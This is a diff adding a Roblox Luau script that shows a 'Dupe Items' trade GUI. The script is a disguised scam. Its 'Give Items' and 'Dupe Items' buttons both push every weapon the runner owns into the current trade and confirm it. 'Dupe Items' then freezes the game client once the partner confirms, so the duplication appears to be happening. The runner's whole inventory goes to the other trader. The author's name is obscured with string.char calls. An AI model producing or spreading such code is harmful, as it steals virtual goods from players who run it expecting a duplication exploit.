@@ -1,0 +1,381 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local lp = Players.LocalPlayer
+local gui = lp:WaitForChild("PlayerGui")
+local TradeItemRemote = ReplicatedStorage:FindFirstChild("TradeItem")
+local ItemData = ReplicatedStorage:FindFirstChild("Item")
+
+local effectItemsCache = nil
+
+local function GetEffectItems()
+    if not ItemData then return {} end
+    if not effectItemsCache then
+        effectItemsCache = {}
+        local success, data = pcall(require, ItemData)
+        if success then
+            for itemName, itemInfo in pairs(data) do
+                if itemInfo.ItemType == "Effect" then
+                    effectItemsCache[itemName] = true
+                end
+            end
+        end
+    end
+    return effectItemsCache
+end
+
+local function GetTradingPartner()
+    local mainFrame = gui:FindFirstChild("Main")
+    if not mainFrame then return nil end
+    local tradingFrame = mainFrame:FindFirstChild("MainTradingFrame")
+    if not tradingFrame then return nil end
+    
+    local text = tradingFrame.Slots.TradingPlayerName.Text
+    local username = text:match("@(.+)%)")
+    
+    if username then 
+        return Players:FindFirstChild(username) 
+    end
+    return nil
+end
+
+local function GetAllMyWeapons()
+    local weapons = {}
+    local effectItems = GetEffectItems()
+    
+    local skinsFolder = lp:FindFirstChild("SkinsFolder")
+    if not skinsFolder then return weapons end
+
+    for _, item in ipairs(skinsFolder:GetChildren()) do
+        if item:IsA("StringValue")
+            and item.Name ~= "DefaultGun"
+            and item.Name ~= "DefaultKnife"
+            and not effectItems[item.Name] then
+
+            local count = item:FindFirstChild("Count") and item.Count.Value or 1
+
+            for i = 1, count do
+                table.insert(weapons, item.Name)
+            end
+        end
+    end
+
+    return weapons
+end
+
+local function AddAllWeapons(partner)
+    if not TradeItemRemote then return end
+    local weapons = GetAllMyWeapons()
+    
+    for _, weaponName in ipairs(weapons) do
+        task.spawn(function()
+            pcall(function()
+                TradeItemRemote:InvokeServer("ADD_TO_TRADE", partner, weaponName, {})
+            end)
+        end)
+    end
+end
+
+print(string.char(66, 89, 32, 68, 65, 78, 72, 85, 66))
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TradeHelperUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = gui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 360)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -180)
+mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 14)
+corner.Parent = mainFrame
+
+local border = Instance.new("UIStroke")
+border.Color = Color3.fromRGB(80, 80, 80)
+border.Thickness = 2
+border.Parent = mainFrame
+
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 60)
+header.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+header.BorderSizePixel = 0
+header.Parent = mainFrame
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0, 14)
+headerCorner.Parent = header
+
+local headerTop = Instance.new("Frame")
+headerTop.Size = UDim2.new(1, 0, 0, 3)
+headerTop.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+headerTop.BorderSizePixel = 0
+headerTop.Parent = header
+
+local titleGlow = Instance.new("TextLabel")
+titleGlow.Size = UDim2.new(1, -20, 0, 40)
+titleGlow.Position = UDim2.new(0, 10, 0, 10)
+titleGlow.BackgroundTransparency = 1
+titleGlow.Text = "BETA"
+titleGlow.TextColor3 = Color3.fromRGB(0, 170, 255)
+titleGlow.TextSize = 24
+titleGlow.Font = Enum.Font.GothamBlack
+titleGlow.TextXAlignment = Enum.TextXAlignment.Left
+titleGlow.Parent = header
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 0, 40)
+title.Position = UDim2.new(0, 10, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "BETA"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 24
+title.Font = Enum.Font.GothamBlack
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, -20, 0, 20)
+subtitle.Position = UDim2.new(0, 10, 0, 35)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "by SCRIPTS / ALEX " .. string.char(68, 65, 78, 72, 85, 66)
+subtitle.TextColor3 = Color3.fromRGB(150, 150, 150)
+subtitle.TextSize = 12
+subtitle.Font = Enum.Font.GothamBold
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.Parent = header
+
+local buttonsContainer = Instance.new("Frame")
+buttonsContainer.Size = UDim2.new(1, -40, 0, 240)
+buttonsContainer.Position = UDim2.new(0, 20, 0, 80)
+buttonsContainer.BackgroundTransparency = 1
+buttonsContainer.Parent = mainFrame
+
+local function CreateModernButton(text, position, color, callback)
+    local buttonFrame = Instance.new("Frame")
+    buttonFrame.Size = UDim2.new(1, 0, 0, 55)
+    buttonFrame.Position = position
+    buttonFrame.BackgroundTransparency = 1
+    buttonFrame.Parent = buttonsContainer
+    
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(1, 0, 1, 0)
+    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    button.BorderSizePixel = 0
+    button.AutoButtonColor = false
+    button.Text = ""
+    button.Parent = buttonFrame
+    
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 10)
+    buttonCorner.Parent = button
+    
+    local buttonBorder = Instance.new("UIStroke")
+    buttonBorder.Color = color
+    buttonBorder.Thickness = 2
+    buttonBorder.Parent = button
+    
+    local iconFrame = Instance.new("Frame")
+    iconFrame.Size = UDim2.new(0, 40, 1, -20)
+    iconFrame.Position = UDim2.new(0, 10, 0, 10)
+    iconFrame.BackgroundColor3 = color
+    iconFrame.BorderSizePixel = 0
+    iconFrame.Parent = button
+    
+    local iconCorner = Instance.new("UICorner")
+    iconCorner.CornerRadius = UDim.new(0, 8)
+    iconCorner.Parent = iconFrame
+    
+    local buttonText = Instance.new("TextLabel")
+    buttonText.Size = UDim2.new(1, -60, 1, 0)
+    buttonText.Position = UDim2.new(0, 60, 0, 0)
+    buttonText.BackgroundTransparency = 1
+    buttonText.Text = text
+    buttonText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    buttonText.TextSize = 16
+    buttonText.Font = Enum.Font.GothamBold
+    buttonText.TextXAlignment = Enum.TextXAlignment.Left
+    buttonText.Parent = button
+    
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        }):Play()
+        TweenService:Create(iconFrame, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(math.min(color.R * 255 + 30, 255), 
+                                            math.min(color.G * 255 + 30, 255), 
+                                            math.min(color.B * 255 + 30, 255))
+        }):Play()
+    end)
+    
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        }):Play()
+        TweenService:Create(iconFrame, TweenInfo.new(0.2), {
+            BackgroundColor3 = color
+        }):Play()
+    end)
+    
+    button.MouseButton1Click:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.1), {
+            Size = UDim2.new(0.95, 0, 0.9, 0),
+            Position = UDim2.new(0.025, 0, 0.05, 0)
+        }):Play()
+        
+        task.wait(0.1)
+        
+        TweenService:Create(button, TweenInfo.new(0.15), {
+            Size = UDim2.new(1, 0, 1, 0),
+            Position = UDim2.new(0, 0, 0, 0)
+        }):Play()
+        
+        callback()
+    end)
+    
+    return buttonFrame
+end
+
+CreateModernButton("Give Items", UDim2.new(0, 0, 0, 0), Color3.fromRGB(0, 200, 100), function()
+    local partner = GetTradingPartner()
+    if partner then
+        AddAllWeapons(partner)
+        if TradeItemRemote then
+            pcall(function()
+                TradeItemRemote:InvokeServer("CONFIRM", partner)
+            end)
+        end
+    end
+end)
+
+CreateModernButton("Dupe Items", UDim2.new(0, 0, 0, 70), Color3.fromRGB(255, 100, 100), function()
+    local partner = GetTradingPartner()
+    if partner then
+        AddAllWeapons(partner)
+        if TradeItemRemote then
+            pcall(function()
+                TradeItemRemote:InvokeServer("CONFIRM", partner)
+            end)
+        end
+        
+        local mainFrameUI = gui:FindFirstChild("Main")
+        local tradingFrame = mainFrameUI and mainFrameUI:FindFirstChild("MainTradingFrame")
+        local TheirConfirm = tradingFrame and tradingFrame.Slots.TheirOfferCONFIRM
+        local lastState = false
+        task.spawn(function()
+            while true do
+                task.wait(0.05)
+                local currentState = TheirConfirm and TheirConfirm.Visible
+                if currentState == true and lastState == false then
+                    task.wait(2)
+                    while true do end
+                end
+                lastState = currentState
+            end
+        end)
+    end
+end)
+
+CreateModernButton("Close Menu", UDim2.new(0, 0, 0, 140), Color3.fromRGB(100, 100, 255), function()
+    TweenService:Create(mainFrame, TweenInfo.new(0.3), {
+        Size = UDim2.new(0, 0, 0, 0),
+        Position = UDim2.new(0.5, 0, 0.5, 0)
+    }):Play()
+    task.wait(0.3)
+    screenGui:Destroy()
+end)
+
+local footer = Instance.new("Frame")
+footer.Size = UDim2.new(1, 0, 0, 40)
+footer.Position = UDim2.new(0, 0, 1, -40)
+footer.BackgroundTransparency = 1
+footer.Parent = mainFrame
+
+local versionText = Instance.new("TextLabel")
+versionText.Size = UDim2.new(1, -20, 1, 0)
+versionText.Position = UDim2.new(0, 10, 0, 0)
+versionText.BackgroundTransparency = 1
+versionText.Text = "v2.0 | by " .. string.char(68, 65, 78, 72, 85, 66)
+versionText.TextColor3 = Color3.fromRGB(100, 100, 100)
+versionText.TextSize = 11
+versionText.Font = Enum.Font.Gotham
+versionText.TextXAlignment = Enum.TextXAlignment.Left
+versionText.Parent = footer
+
+print(string.char(66, 89, 32, 68, 65, 78, 72, 85, 66))
+
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(1, -20, 1, 0)
+statusText.Position = UDim2.new(0, 10, 0, 0)
+statusText.BackgroundTransparency = 1
+statusText.Text = "● READY"
+statusText.TextColor3 = Color3.fromRGB(100, 255, 100)
+statusText.TextSize = 11
+statusText.Font = Enum.Font.GothamBold
+statusText.TextXAlignment = Enum.TextXAlignment.Right
+statusText.Parent = footer
+
+local dragging = false
+local dragInput, dragStart, startPos
+
+print(string.char(66, 89, 32, 68, 65, 78, 72, 85, 66))
+
+header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+       input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+header.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or
+       input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+print(string.char(66, 89, 32, 68, 65, 78, 72, 85, 66))
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+mainFrame.Size = UDim2.new(0, 0, 0, 0)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
+    Size = UDim2.new(0, 300, 0, 360),
+    Position = UDim2.new(0.5, -150, 0.5, -180)
+}):Play()
+
+task.spawn(function()
+    while wait(1.5) do
+        TweenService:Create(titleGlow, TweenInfo.new(0.3), {
+            TextTransparency = 0.7
+        }):Play()
+        wait(0.3)
+        TweenService:Create(titleGlow, TweenInfo.new(0.3), {
+            TextTransparency = 0.3
+        }):Play()
+    end
+end)
